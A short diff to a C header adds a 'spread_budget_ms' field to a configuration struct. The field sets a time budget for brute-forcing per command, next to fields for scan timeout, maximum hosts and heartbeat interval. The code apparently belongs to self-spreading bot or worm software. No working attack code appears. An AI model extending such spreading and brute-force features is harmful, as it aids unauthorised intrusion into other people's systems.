@@ -285,6 +285,10 @@ typedef struct {
     uint32_t scan_timeout_ms;
     uint32_t scan_max_hosts;
 
+    /* #191: per-command brute-force wall-clock budget in ms
+     * (config key spread_budget_ms, clamped 5000..600000). */
+    uint32_t spread_budget_ms;
+
     /* Heartbeat interval in seconds (0 = use default) */
     uint32_t heartbeat_interval;
 
